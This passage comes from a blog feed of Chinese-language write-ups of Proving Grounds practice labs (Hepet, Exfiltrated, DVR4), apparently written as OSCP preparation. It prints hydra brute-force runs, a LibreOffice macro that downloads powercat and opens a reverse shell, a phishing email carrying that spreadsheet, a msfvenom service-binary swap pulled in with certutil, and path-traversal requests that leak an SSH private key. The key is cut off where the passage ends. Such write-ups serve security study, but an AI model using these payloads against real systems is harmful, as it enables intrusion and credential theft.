class="number">228</span> Oct <span class="number">20</span>  <span class="number">2020</span> .postcssrc.js</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">346</span> Oct <span class="number">20</span>  <span class="number">2020</span> .tern-project</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> build</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> config</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp           <span class="number">1376</span> Oct <span class="number">20</span>  <span class="number">2020</span> index.html</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp         <span class="number">425010</span> Oct <span class="number">20</span>  <span class="number">2020</span> package-lock.json</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp           <span class="number">2454</span> Oct <span class="number">20</span>  <span class="number">2020</span> package.json</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp           <span class="number">1100</span> Oct <span class="number">20</span>  <span class="number">2020</span> README.md</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> src</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> static</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">127</span> Oct <span class="number">20</span>  <span class="number">2020</span> _redirects</span><br><span class="line"><span class="number">226</span> Transfer OK</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lftp -e <span class="string">&quot;mirror -c -e / ftp&quot;</span> ftp://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">20001</span></span><br></pre></td></tr></table></figure>

<p>查看是cms: vue-blog-demo v1.0.0, 没有其他信息，并且8000用的好像也不是这个， 搜索FileZilla ftpd 0.9.41 beta 也没有可利用的已知漏洞</p>
<h2 id="445-smbclient"><a href="#445-smbclient" class="headerlink" title="445 smbclient"></a>445 smbclient</h2><p>不支持匿名登录，使用扫出来的admin爆破下密码，没有结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> by van Hauser/THC &amp; David Maciejak - Please do <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span>-02-<span class="number">23</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">36</span></span><br><span class="line">[INFO] Reduced number of tasks to <span class="number">1</span> (smb does <span class="keyword">not</span> like parallel connections)</span><br><span class="line">[DATA] <span class="built_in">max</span> <span class="number">1</span> task per <span class="number">1</span> server, overall <span class="number">1</span> task, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">14344399</span> tries per task</span><br><span class="line">[DATA] attacking smb://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">445</span>/</span><br><span class="line">[ERROR] invalid reply <span class="keyword">from</span> target smb://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">445</span>/</span><br></pre></td></tr></table></figure>

<h2 id="2224-mlss"><a href="#2224-mlss" class="headerlink" title="2224 mlss"></a>2224 mlss</h2><p>mailing list subscriber services, 有订阅和忘记密码功能，暂时没有可利用的点， 也搜不到mlss的已知漏洞</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-117.png.png"></p>
<h2 id="79-finger"><a href="#79-finger" class="headerlink" title="79 finger"></a>79 finger</h2><p>使用finger-user-enum.pl 枚举用户名</p>
<blockquote>
<p>github: <a href="https://github.com/pentestmonkey/finger-user-enum">https://github.com/pentestmonkey/finger-user-enum</a></p>
<p>工具是在walkThrough: <a href="https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b">https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b</a> 中看到的</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span> |grep -v <span class="string">&#x27;is not known&#x27;</span></span><br><span class="line">Starting finger-user-enum v1<span class="number">.0</span> ( http://pentestmonkey.net/tools/finger-user-enum )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######## Scan started at Sun Feb 23 16:27:33 2025 #########</span></span><br><span class="line">admin@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: admin         Name: Mail System Administrator....[No profile information]..</span><br><span class="line">agnes@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: agnes         Name: Agnes....[No profile information]..</span><br><span class="line">charlotte@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: charlotte         Name: Charlotte....[No profile information]..</span><br><span class="line">jonas@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: jonas         Name: Jonas....[No profile information]..</span><br><span class="line">magnus@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: magnus         Name: Magnus....[No profile information]..</span><br><span class="line">martha@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: martha         Name: Martha....[No profile information]..</span><br></pre></td></tr></table></figure>

<h2 id="Mercury-32-mail"><a href="#Mercury-32-mail" class="headerlink" title="Mercury&#x2F;32 mail"></a>Mercury&#x2F;32 mail</h2><p>再枚举下用户名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hydra smtp-enum://<span class="number">192.168</span><span class="number">.180</span><span class="number">.140</span>:<span class="number">25</span>/expn -L <span class="string">&quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot;</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>Mercury&#x2F;32 有缓冲区溢出漏洞，但是不知道版本号，测试了一个无法利用成功</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-115.png.png"></p>
<h2 id="8000-443"><a href="#8000-443" class="headerlink" title="8000 &#x2F; 443"></a>8000 &#x2F; 443</h2><p>基本是静态网页，没有可交互的地方</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-118.png.png"></p>
<p><code>Jonas K.</code>的介绍像是密码， 我没发现这个密码，看了hits才留意到。walkThrough使用了 html2markdown</p>
<p><code>curl</code> <code>http://192.168.184.140:8000/|</code> <code>html2markdown &gt; html.md</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-114.png.png"></p>
<p>得到密码后第一想法是smbclient， 测试发现登录失败，ftp也不行，再次看了hits，登录邮箱</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-119.png.png"><img data-src="https://thiiiiink.com/202508/asynccode-116.png.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">telnet <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span> <span class="number">110</span></span><br><span class="line">Trying <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>...</span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>.</span><br><span class="line">Escape character <span class="keyword">is</span> <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK &lt;<span class="number">14653593.7950</span>@localhost&gt;, POP3 server ready.</span><br><span class="line">user Jonas</span><br><span class="line">+OK Jonas <span class="keyword">is</span> known here.</span><br><span class="line"><span class="keyword">pass</span> SicMundusCreatusEst</span><br><span class="line">+OK Welcome! <span class="number">4</span> messages (<span class="number">4744</span> <span class="built_in">bytes</span>)</span><br><span class="line"><span class="built_in">help</span></span><br><span class="line">+OK</span><br><span class="line">Mercury/<span class="number">32</span> MTS Post Office Protocol v3 server v4<span class="number">.62</span>,</span><br><span class="line">Copyright (c) <span class="number">1993</span>-<span class="number">2008</span> David Harris.</span><br><span class="line">This server recognizes the following commands:</span><br><span class="line">  USER - login <span class="keyword">as</span> a user</span><br><span class="line">  PASS - specify a password</span><br><span class="line">  APOP - perform secure login</span><br><span class="line">  CAPA - RFC2449 capability discovery</span><br><span class="line">  STLS - Start TLS negotiation, <span class="keyword">if</span> enabled</span><br><span class="line">  STAT - show mailbox statistics</span><br><span class="line">  RETR - send a message</span><br><span class="line">  LIST - show message numbers <span class="keyword">and</span> sizes</span><br><span class="line">  DELE - delete a message</span><br><span class="line">  RSET - <span class="string">&#x27;undo&#x27;</span> <span class="built_in">all</span> mailbox changes</span><br><span class="line">  TOP  - show lines <span class="keyword">from</span> a message</span><br><span class="line">  QUIT - close the connection</span><br><span class="line">  NOOP, RPOP, LAST are also supported.</span><br><span class="line"></span><br><span class="line">Extended commands:</span><br><span class="line">  XTND XMIT  - Send a message via POP3</span><br><span class="line">  XTND XLST  - Eudora extended <span class="built_in">list</span> command</span><br><span class="line">  UIDL - <span class="keyword">return</span> unique identifier (RFC1725).</span><br><span class="line">.</span><br><span class="line"><span class="built_in">list</span> 查看所有邮件</span><br><span class="line">retr <span class="number">2</span>  查看具体内容</span><br></pre></td></tr></table></figure>

<p>邮件内容是： 新来的PR要求大家把spreadsheet发给mailadmin; mainadmin告诉大家公司改用LibreOffice了，spreadsheet就是office中的excel,</p>
<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>新建一个恶意的ods文件, 操作方式如下：</p>
<blockquote>
<p><a href="https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html">https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html</a></p>
</blockquote>
<p>反弹shell macros:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Sub Main</span><br><span class="line">Shell(<span class="string">&quot;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.45.234/powercat.ps1&#x27;);powercat -c 192.168.45.169 -p 4444 -e powershell&quot;</span>)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>设置为打开文件时，执行macros 反弹shell. 80端口启动http.server, 使用sendemail把附件发给mailadmin，等待片刻后收到反弹shell, 用户是Ela Arwel</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sendemail -f <span class="string">&#x27;jonas@localhost&#x27;</span> -t <span class="string">&#x27;mailadmin@localhost&#x27;</span> -s <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">25</span> -u <span class="string">&#x27;another spreadsheet&#x27;</span> -m <span class="string">&#x27;spreadsheet&#x27;</span> -a /home/kali/pentestools/windows/clientside/test.ods</span><br><span class="line">Feb <span class="number">23</span> <span class="number">15</span>:<span class="number">54</span>:03 kali sendemail[<span class="number">3004302</span>]: Email was sent successfully!</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="literal">-nvlp</span> <span class="number">4444</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.234</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.184.140</span>] <span class="number">51171</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Try</span> the new cross<span class="literal">-platform</span> PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Program Files\LibreOffice\program&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">hepet\ela arwel</span><br></pre></td></tr></table></figure>

<h1 id="Eacalation"><a href="#Eacalation" class="headerlink" title="Eacalation"></a>Eacalation</h1><p>收集信息发现 service: VeyonService 由localSystem启动，并且在Ela arwrl目录下，有Full control权限，msfenvom生成反弹shell可执行文件，替换veyon-service.exe</p>
<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=443 -f exe -o shell.exe</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users&gt; <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Service | </span><br><span class="line">    <span class="built_in">Select-Object</span> Name, State, PathName, StartMode, StartName | </span><br><span class="line">    <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.State <span class="operator">-like</span> <span class="string">&#x27;Running&#x27;</span> <span class="operator">-and</span> <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;*svchost.exe*&#x27;</span> &#125;</span><br><span class="line">Name      : COMSysApp</span><br><span class="line">State     : Running</span><br><span class="line">PathName  : C:\WINDOWS\system32\dllhost.exe /Processid:&#123;<span class="number">02</span>D4B3F1<span class="literal">-FD88-11D1-960D-00805FC79235</span>&#125;</span><br><span class="line">StartMode : Manual</span><br><span class="line">StartName : LocalSystem</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Name      : VeyonService</span><br><span class="line">State     : Running</span><br><span class="line">PathName  : C:\Users\Ela Arwel\Veyon\veyon<span class="literal">-service</span>.exe</span><br><span class="line">StartMode : Auto</span><br><span class="line">StartName : LocalSystem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; certutil <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">45.234</span>/tmp/shell.exe s.exe</span><br><span class="line">                             certutil <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">45.234</span>/tmp/shell.exe s.exe</span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">45.234</span>/tmp/shell.exe s.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: <span class="literal">-URLCache</span> command completed successfully.</span><br><span class="line">                                                 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">mv</span> veyon<span class="literal">-service</span>.exe veyon.exe</span><br><span class="line">                             <span class="built_in">mv</span> veyon<span class="literal">-service</span>.exe veyon.exe</span><br><span class="line"><span class="built_in">mv</span> veyon<span class="literal">-service</span>.exe veyon.exe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">mv</span> s.exe veyon<span class="literal">-service</span>.exe</span><br><span class="line">                             <span class="built_in">mv</span> s.exe veyon<span class="literal">-service</span>.exe</span><br><span class="line"><span class="built_in">mv</span> s.exe veyon<span class="literal">-service</span>.exe                   </span><br></pre></td></tr></table></figure>

<p>没有重启服务权限，但是有重启机器权限，直接shutdown &#x2F;r, 重启后获取system shell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">restart-service</span> VeyonService</span><br><span class="line">                             <span class="built_in">restart-service</span> VeyonService</span><br><span class="line"><span class="built_in">restart-service</span> VeyonService</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">restart-service</span> : Service <span class="string">&#x27;Veyon Service (VeyonService)&#x27;</span> cannot be stopped due to the following error: Cannot open </span><br><span class="line">VeyonService service on computer <span class="string">&#x27;.&#x27;</span>.</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ <span class="built_in">restart-service</span> VeyonService</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : CloseError: (System.ServiceProcess.ServiceController:ServiceController) [<span class="built_in">Restart-Service</span> </span><br><span class="line">   ], ServiceCommandException</span><br><span class="line">    + FullyQualifiedErrorId : CouldNotStopService,Microsoft.PowerShell.Commands.RestartServiceCommand</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; net stop VeyonService</span><br><span class="line">                             net stop VeyonService</span><br><span class="line">net stop VeyonService</span><br><span class="line">System error <span class="number">5</span> has occurred.</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; </span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">                             shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">                                                 </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="literal">-nvlp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.234</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.184.140</span>] <span class="number">49668</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19042.1348</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>收集信息还是忽略了很多内容，不只要关注软件漏洞、CMS漏洞，手动信息收集也很重要，点击测试查看所有内容知道找到突破点。</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Exfiterated</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-52.png.png"></p>
<p>80端口 发现cms subrion 4.2</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-51.png.png"></p>
<h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><p>任意文件上传漏洞</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-50.png.png"></p>
<p>直接通过ip访问，会跳转到<a href="http://exfiltrated.offsec/">http://exfiltrated.offsec</a><br>绑定hosts<br><a href="http://exfiltrated.offsec/panel/">http://exfiltrated.offsec/panel/</a><br>弱密码 admin:admin 成功进入</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>python3 49876.py -u <a href="http://exfiltrated.offsec/panel/">http://exfiltrated.offsec/panel/</a> -l admin -p admin<br>注意结尾有个 <code>/</code><br>成功反弹shell</p>
<p>直接登录后台也可以看到文件上传位置</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-54.png.png"></p>
<h2 id="EP"><a href="#EP" class="headerlink" title="EP"></a>EP</h2><p>看了提示之后，再次检查crontab</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-53.png.png"></p>
<p>再明显不过了, 但是没有自己意识到<br>下载exp,<a href="https://github.com/UNICORDev/exploit-CVE-2021-22204/blob/main/exploit-CVE-2021-22204.py">https://github.com/UNICORDev/exploit-CVE-2021-22204/blob/main/exploit-CVE-2021-22204.py</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python3 exploit-CVE<span class="number">-2021</span><span class="number">-22204.</span>py -s  <span class="number">192.168</span><span class="number">.45</span><span class="number">.188</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure>

<h2 id="linux提权方式"><a href="#linux提权方式" class="headerlink" title="linux提权方式"></a>linux提权方式</h2><ol>
<li>crontab</li>
<li>sudo</li>
<li>suid</li>
<li>cap</li>
<li>&#x2F;etc&#x2F;passwd ssh&#x2F;authorizd_keys可写</li>
<li>内核漏洞</li>
<li>系统漏洞</li>
</ol>
<h2 id="反思："><a href="#反思：" class="headerlink" title="反思："></a>反思：</h2><ol>
<li>手动检查了以上所有点，但是太不仔细认真了，看到不熟悉的东西容易下意识忽略，看到文件不可写之后放弃了,没具体看文件内容, 多搜索，多记录</li>
<li>mysql、多余的用户coran上浪费了太多时间，经验太不足了，容易陷入兔子洞，但最重要的是容易忽略关键点</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - DVR4</title>
    <url>/post/20250222023007.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Medium</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">OS: Windows <span class="number">10</span>, Windows Server <span class="number">2019</span>, Windows Server <span class="number">2016</span></span><br><span class="line">OS version: <span class="string">&#x27;10.0&#x27;</span></span><br><span class="line">OS release: <span class="string">&#x27;2004&#x27;</span></span><br><span class="line">OS build: <span class="string">&#x27;19041&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ssh found on tcp/<span class="number">22</span>.</span><br><span class="line">     Bitvise WinSSHD <span class="number">8.48</span> (FlowSsh <span class="number">8.48</span>; protocol <span class="number">2.0</span>; non<span class="literal">-commercial</span> use)</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">135</span>.</span><br><span class="line"></span><br><span class="line">[*] netbios<span class="literal">-ssn</span> found on tcp/<span class="number">139</span>.</span><br><span class="line"></span><br><span class="line">[*] microsoft<span class="literal">-ds</span> found on tcp/<span class="number">445</span>.</span><br><span class="line">    SMB <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line">[*] http<span class="literal">-proxy</span> found on tcp/<span class="number">8080</span>.</span><br><span class="line">    &lt;meta name=<span class="string">&quot;GENERATOR&quot;</span> content=<span class="string">&quot;Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]&quot;</span>&gt;</span><br><span class="line">        About the program:</span><br><span class="line"> </span><br><span class="line">    Argus Surveillance DVR</span><br><span class="line">    Program is UNREGISTERED</span><br><span class="line">    Version: <span class="number">4.0</span></span><br><span class="line">    Released <span class="number">18</span>/<span class="number">12</span>/<span class="number">2008</span></span><br><span class="line">    Argus Surveillance Inc.</span><br><span class="line"></span><br><span class="line">    http<span class="literal">-vuln-cve2011-3368</span>:</span><br><span class="line">    CVE:CVE<span class="literal">-2005-3299</span>  phpmyadmin</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/<span class="number">5040</span>.</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49664</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49665</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49666</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49667</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49668</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49669</span>.</span><br></pre></td></tr></table></figure>

<h1 id="22-WinSSHD"><a href="#22-WinSSHD" class="headerlink" title="22 WinSSHD"></a>22 WinSSHD</h1><p>windows下的sshd实现，和linux一样在用户.ssh目录下会有公私钥相关文件</p>
<p>8.48版本没有搜索到可利用的已知漏洞</p>
<h2 id="445-SMB"><a href="#445-SMB" class="headerlink" title="445 SMB"></a>445 SMB</h2><p>无法匿名登录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">smbclient <span class="literal">-L</span> //<span class="number">192.168</span>.<span class="number">140.179</span> <span class="literal">-N</span></span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<h2 id="8080-Argus-Surveillance-DVR"><a href="#8080-Argus-Surveillance-DVR" class="headerlink" title="8080 Argus Surveillance DVR"></a>8080 Argus Surveillance DVR</h2><p>进入后在user下发现两个用户名，administrator和viewer, 看到有修改密码选项，并且不需要输入原密码，把密码改成123， 然后通过ssh登录，提示密码不正确， gobuster目录扫描也没有收获</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-107.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-106.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-105.png.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh viewer@<span class="number">192.168</span>.<span class="number">140.179</span> </span><br><span class="line">viewer@<span class="number">192.168</span>.<span class="number">140.179</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">viewer@192.168.140.179&#x27;</span>s password: </span><br><span class="line">                                        </span><br></pre></td></tr></table></figure>

<p>searchSploit搜一下已知漏洞，全部复制过来看看说明</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-110.png.png"></p>
<p>50261 是没有引号的service路径，后面可能提权有用，但是poc里面也没有利用方法</p>
<p>50130 弱密码破解，并有提示arugs Surveillance DVR的配置路径，看代码是把加密的字符串按4位字符一组的解码</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-113.png.png"></p>
<p>45296 路径穿越，poc直接测一下, 有结果返回，可以利用，但是能读什么呢</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD=&quot;</span></span><br><span class="line">; <span class="keyword">for</span> <span class="number">16</span><span class="literal">-bit</span> app support</span><br><span class="line">[<span class="number">386</span><span class="type">Enh</span>]</span><br><span class="line">woafont=dosapp.fon</span><br><span class="line">EGA80WOA.FON=EGA80WOA.FON</span><br><span class="line">EGA40WOA.FON=EGA40WOA.FON</span><br><span class="line">CGA80WOA.FON=CGA80WOA.FON</span><br><span class="line">CGA40WOA.FON=CGA40WOA.FON</span><br><span class="line"></span><br><span class="line">[<span class="type">drivers</span>]</span><br><span class="line">wave=mmdrv.dll</span><br><span class="line">timer=timer.drv</span><br><span class="line"></span><br><span class="line">[<span class="type">mci</span>]</span><br></pre></td></tr></table></figure>

<p>45312 提权： 在Argus 应用文件夹下放一个恶意<code>gsm_codec.dll</code>,这个dll会被以SYSTEM账号执行</p>
<h1 id="FootHold"><a href="#FootHold" class="headerlink" title="FootHold"></a>FootHold</h1><p>4种exploit 暂时能利用的是路径穿越，结合其他信息，能读的有administrator和viewer的私钥、<code>C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini</code> 配置信息。</p>
<ol>
<li>成功读到了viewer账号的私钥</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fadministrator%2F.ssh%2Fid_rsa&quot;</span></span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;File Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Cannot find this file.&lt;/H1&gt;The requested file: &lt;B&gt;/WEBACCOUNT.CGI?OkBtn=  Ok  &amp;RESULTPAGE=../../../../../../../../../../../../../../../../Users/administrator/.ssh/id_rsa&lt;/B&gt; was not found.&lt;/BODY&gt;&lt;/HTML&gt;                                                                                                                                                 </span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&quot;</span></span><br><span class="line"><span class="literal">-----BEGIN</span> OPENSSH PRIVATE KEY<span class="literal">-----</span></span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5J</span><br><span class="line">Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP</span><br><span class="line">iJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGx</span><br><span 